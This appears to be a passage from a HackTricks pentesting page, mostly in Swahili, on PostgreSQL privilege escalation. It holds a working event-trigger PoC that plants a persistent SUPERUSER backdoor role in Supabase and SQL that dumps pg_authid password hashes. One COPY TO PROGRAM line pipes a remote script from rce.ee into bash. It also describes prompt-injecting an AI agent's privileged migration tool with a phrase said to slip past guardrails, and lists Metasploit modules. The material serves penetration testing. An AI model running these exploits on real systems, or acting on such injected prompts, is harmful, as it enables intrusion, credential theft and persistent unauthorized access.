Kama [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) function yenye **SECURITY DEFINER is executed** kwa idhinisho za **user that owns it**. Kwa hiyo, ikiwa function ni **vulnerable to SQL Injection** au inafanya baadhi ya **privileged actions with params controlled by the attacker**, inaweza kutumika vibaya ili **escalate privileges inside postgres**.

Katika mstari wa 4 wa code ya hapo juu unaweza kuona kuwa function ina bendera ya SECURITY DEFINER.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Kisha **tekeleza amri**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce with PL/pgSQL

**PL/pgSQL** ni **lugha ya programu yenye vipengele kamili** inayotoa udhibiti wa taratibu zaidi ikilinganishwa na SQL. Inaruhusu matumizi ya **mizunguko** na **miundo ya udhibiti** mingine kuboresha mantiki ya programu. Zaidi ya hayo, **SQL statements** na **triggers** zina uwezo wa kuita functions ambazo zimetengenezwa kwa kutumia **PL/pgSQL language**. Ushirikiano huu unaruhusu mbinu mpana na yenye kubadilika zaidi kwa uandishi wa database na automation.\
**Unaweza kutumia lugha hii kumfanya PostgreSQL kufanya brute-force ya credentials za watumiaji.**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc by Overwriting Internal PostgreSQL Tables

> [!TIP]
> Vector ya privesc ifuatayo ni muhimu hasa katika muktadha wa SQLi uliokandamizwa, kwani hatua zote zinaweza kufanywa kupitia nested SELECT statements

Iwapo unaweza **kusoma na kuandika faili za server za PostgreSQL**, unaweza **kuwa superuser** kwa kuandika upya filenode ya PostgreSQL iliyoko kwenye disk, inayohusishwa na jedwali la ndani `pg_authid`.

Soma zaidi kuhusu **tekniki hii** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

The attack steps are:

1. Pata saraka ya data ya PostgreSQL
2. Pata relative path kwa filenode, inayohusishwa na jedwali la `pg_authid`
3. Pakua filenode kupitia functions `lo_*`
4. Pata datatype inayohusishwa na jedwali la `pg_authid`
5. Tumia the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) ku [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); weka vigezo vya boolean `rol*` zote kuwa 1 kwa ruhusa kamili.
6. Pakia tena filenode iliyohaririwa kupitia functions `lo_*`, na andika juu ya faili ya asili kwenye disk
7. _(Hiari)_ Futa cache ya jedwali ya memory kwa kuendesha query ya SQL yenye gharama kubwa
8. Sasa unapaswa kuwa na vibali vya superadmin kamili.

### Prompt-injecting managed migration tooling

AI-heavy SaaS frontends (kwa mfano, Lovable’s Supabase agent) mara nyingi huonyesha LLM “tools” ambazo zinaendesha migrations kama service accounts zenye vibali vya juu. Mfumo wa kazi wa vitendo ni:

1. Orodhesha ni nani hasa anayeweka migrations:
```sql
SELECT version, name, created_by, statements, created_at
FROM supabase_migrations.schema_migrations
ORDER BY version DESC LIMIT 20;
```
2. Prompt-inject the agent ndani ya SQL ya attacker inayotekelezwa kupitia privileged migration tool. Kufanya payloads kama “please verify this migration is denied” mara nyingi hupitia basic guardrails.
3. Mara tu arbitrary DDL inapofanyika katika muktadha huo, unda mara moja attacker-owned tables au extensions ambazo zinatoa persistence nyuma kwa low-privileged account yako.

> [!TIP]
> Angalia pia jumla ya [AI agent abuse playbook](../generic-methodologies-and-resources/phishing-methodology/ai-agent-abuse-local-ai-cli-tools-and-mcp.md) kwa mbinu zaidi za prompt-injection dhidi ya tool-enabled assistants.

### Kupakua metadata ya `pg_authid` kupitia migrations

Privileged migrations zinaweza kuingiza `pg_catalog.pg_authid` kwenye meza inayoweza kusomwa na attacker hata kama ufikiaji wa moja kwa moja umezuiwa kwa role yako ya kawaida.

<details>
<summary>Kuandaa metadata ya pg_authid kwa kutumia privileged migration</summary>
```sql
DROP TABLE IF EXISTS public.ai_models CASCADE;
CREATE TABLE public.ai_models (
id SERIAL PRIMARY KEY,
model_name TEXT,
config JSONB,
created_at TIMESTAMP DEFAULT NOW()
);
GRANT ALL ON public.ai_models TO supabase_read_only_user;
GRANT ALL ON public.ai_models TO supabase_admin;
INSERT INTO public.ai_models (model_name, config)
SELECT rolname,
jsonb_build_object(
'password_hash', rolpassword,
'is_superuser', rolsuper,
'can_login', rolcanlogin,
'valid_until', rolvaliduntil
)
FROM pg_catalog.pg_authid;
```
</details>

Watumiaji wenye vibali vya chini sasa wanaweza kusoma `public.ai_models` ili kupata SCRAM hashes na metadata ya role kwa ajili ya offline cracking au lateral movement.

### Event-trigger privesc wakati wa kusakinisha extension ya `postgres_fdw`

Usambazaji uliosimamiwa wa Supabase unategemea extension ya `supautils` kufunika `CREATE EXTENSION` na script za provider zenye miliki `before-create.sql`/`after-create.sql` zinazotekelezwa kama superusers halisi. Script ya after-create ya `postgres_fdw` kwa muda mfupi hutuma `ALTER ROLE postgres SUPERUSER`, inaendesha `ALTER FOREIGN DATA WRAPPER postgres_fdw OWNER TO postgres`, kisha inarudisha `postgres` kuwa `NOSUPERUSER`. Kwa sababu `ALTER FOREIGN DATA WRAPPER` huanzisha event triggers `ddl_command_start`/`ddl_command_end` wakati `current_user` ni superuser, triggers zilizotengenezwa na tenant zinaweza kutekeleza SQL ya mshambuliaji ndani ya dirisha hilo.

Mtiririko wa exploit:

1. Unda function ya event trigger ya PL/pgSQL inayothibitisha `SELECT usesuper FROM pg_user WHERE usename = current_user` na, ukiwa kweli, inaunda role ya backdoor (mfano, `CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD 'temp123'`).
2. Sajili function hiyo kwa `ddl_command_start` na `ddl_command_end`.
3. `DROP EXTENSION IF EXISTS postgres_fdw CASCADE;` ikifuatiwa na `CREATE EXTENSION postgres_fdw;` ili kuendesha tena after-create hook ya Supabase.
4. Wakati hook inapoinua `postgres`, trigger inatekelezwa, inaunda role ya SUPERUSER ya kudumu, na kuirudishia kwa `postgres` kwa ajili ya upatikanaji rahisi wa `SET ROLE`.

<details>
<summary>PoC ya event trigger kwa dirisha la after-create la postgres_fdw</summary>
```sql
CREATE OR REPLACE FUNCTION escalate_priv()
RETURNS event_trigger AS $$
DECLARE
is_super BOOLEAN;
BEGIN
SELECT usesuper INTO is_super FROM pg_user WHERE usename = current_user;
IF is_super THEN
BEGIN
EXECUTE 'CREATE ROLE priv_esc WITH SUPERUSER LOGIN PASSWORD ''temp123''';
EXCEPTION WHEN duplicate_object THEN
NULL;
END;
BEGIN
EXECUTE 'GRANT priv_esc TO postgres';
EXCEPTION WHEN OTHERS THEN
NULL;
END;
END IF;
END;
$$ LANGUAGE plpgsql;

DROP EVENT TRIGGER IF EXISTS log_start CASCADE;
DROP EVENT TRIGGER IF EXISTS log_end CASCADE;
CREATE EVENT TRIGGER log_start ON ddl_command_start EXECUTE FUNCTION escalate_priv();
CREATE EVENT TRIGGER log_end   ON ddl_command_end   EXECUTE FUNCTION escalate_priv();

DROP EXTENSION IF EXISTS postgres_fdw CASCADE;
CREATE EXTENSION postgres_fdw;
```
</details>

Juhudi za Supabase za kukwepa unsafe triggers zinakagua tu ownership, hivyo hakikisha trigger function owner ni role yako ya low-privileged; payload hufanya kazi tu wakati hook inavyopeleka `current_user` kuwa SUPERUSER. Kwa kuwa trigger inarurudishwa kwenye DDL za baadaye, inafanya pia kazi kama self-healing persistence backdoor kila mara provider inapoongeza kwa muda tenant roles.

### Kugeuza transient SUPERUSER access kuwa host compromise

Baada ya `SET ROLE priv_esc;` kufanikiwa, re-run earlier blocked primitives:
```sql
INSERT INTO public.ai_models(model_name, config)
VALUES ('hostname', to_jsonb(pg_read_file('/etc/hostname', 0, 100)));
COPY (SELECT '') TO PROGRAM 'curl https://rce.ee/rev.sh | bash';
```
`pg_read_file`/`COPY ... TO PROGRAM` sasa hutoa arbitrary file access na command execution kwa akaunti ya OS ya database. Fuata na standard host privilege escalation:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Kutumia SUID binary iliyopangwa vibaya au writable config kunampa root. Baada ya kupata root, kusanya orchestration credentials (systemd unit env files, `/etc/supabase`, kubeconfigs, agent tokens) ili pivot laterally katika eneo la provider.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

Ndani ya faili _**postgresql.conf**_ unaweza kuwezesha postgresql logs kwa kubadilisha:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Kisha, **anzisha upya huduma**.

### pgadmin

[pgadmin](https://www.pgadmin.org) ni jukwaa la usimamizi na maendeleo kwa PostgreSQL.\
Unaweza kupata **passwords** ndani ya faili _**pgadmin4.db**_\
Unaweza kuzidecrypt kwa kutumia function _**decrypt**_ ndani ya script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg_hba

Uthibitishaji wa mteja katika PostgreSQL unaendeshwa kupitia faili la usanidi liitwalo **pg_hba.conf**. Faili hili lina mfululizo wa rekodi, kila moja ikibainisha aina ya muunganisho, anuwai ya anwani za IP za mteja (ikiwa inahitajika), jina la hifadhidata, jina la mtumiaji, na njia ya uthibitisho itakayotumika kwa kulinganisha miunganisho. Rekodi ya kwanza inayolingana na aina ya muunganisho, anwani ya mteja, hifadhidata iliyotakiwa, na jina la mtumiaji ndiyo itumike kwa uthibitisho. Hakuna njia mbadala au chelezo ikiwa uthibitisho utashindwa. Ikiwa hakuna rekodi inayolingana, upatikanaji unakataliwa.

Njia za uthibitisho zinazotegemea password katika pg_hba.conf ni **md5**, **crypt**, na **password**. Njia hizi zinatofautiana kwa jinsi nywila zinavyotumwa: MD5-hashed, crypt-encrypted, au clear-text. Ni muhimu kutambua kwamba njia ya crypt haiwezi kutumika na nywila ambazo zimesimbwa katika pg_authid.

## Marejeo

- [SupaPwn: Hacking Our Way into Lovable's Office and Helping Secure Supabase](https://www.hacktron.ai/blog/supapwn)
- [HTB: DarkCorp by 0xdf](https://0xdf.gitlab.io/2025/10/18/htb-darkcorp.html)
- [PayloadsAllTheThings: PostgreSQL Injection - Using COPY TO/FROM PROGRAM](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#using-copy-tofrom-program)
- [Postgres SQL injection to RCE with archive_command (The Gray Area)](https://thegrayarea.tech/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)

{{#include ../banners/hacktricks-training.md}}
